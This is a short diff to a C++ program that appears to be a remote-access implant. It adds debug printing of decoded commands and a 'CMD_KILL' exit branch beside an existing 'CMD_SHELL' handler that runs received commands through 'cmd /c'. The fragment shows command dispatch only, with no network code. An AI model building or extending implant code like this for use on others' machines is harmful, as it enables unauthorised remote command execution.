@@ -554,6 +554,8 @@ int main()
         BYTE* raw = (BYTE*)cmd.data();
         std::string to_decode = (char*)raw;
 
+        std::cout << to_decode << std::endl;
+
         // I dont want to talk about this if statement Ill refactor later I promise
         if (to_decode.length() < 10) {
             int DO_NOTHING = 1;
@@ -579,7 +581,10 @@ int main()
             std::string cmd_id = parsed_cmd[0];
 
             // If statements for the rest of the command
-
+            // If exit
+            if (parsed_cmd[1] == "CMD_KILL") {
+                return 0;
+            }
             // If shell exec
             if (parsed_cmd[1] == "CMD_SHELL") {
                 std::string sys = "cmd /c ";
